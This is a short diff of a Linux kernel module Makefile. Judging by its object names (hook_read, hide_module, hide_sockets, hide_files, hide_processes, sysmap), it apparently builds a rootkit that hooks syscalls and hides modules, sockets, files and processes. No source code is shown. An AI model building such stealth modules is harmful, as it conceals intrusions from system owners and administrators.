@@ -1,6 +1,5 @@
 obj-m += mod.o
-mod-objs := hook_read.o module_hiding.o sysmap.o global.o
-
+mod-objs := hook_read.o hide_module.o sysmap.o global.o hide_sockets.o hide_files.o hide_processes.o
 
 
 all: sysmap.h
